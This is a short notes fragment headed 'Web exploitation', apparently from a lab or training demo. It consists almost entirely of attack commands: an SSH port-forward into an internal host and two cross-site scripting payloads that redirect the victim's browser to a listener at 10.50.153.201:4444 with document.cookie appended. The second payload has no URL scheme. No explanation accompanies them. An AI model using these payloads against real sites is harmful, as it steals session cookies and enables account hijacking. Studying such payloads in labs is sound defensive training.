### Web exploitation 
DEMO*
```bash
ssh demo1@10.50.15.172 -L:1111:10.208.50.42:80
<script>document.location="http://10.50.153.201:4444" + document.cookie;</script>
<script>document.location="10.50.153.201:4444/?username=" + document.cookie;</script>
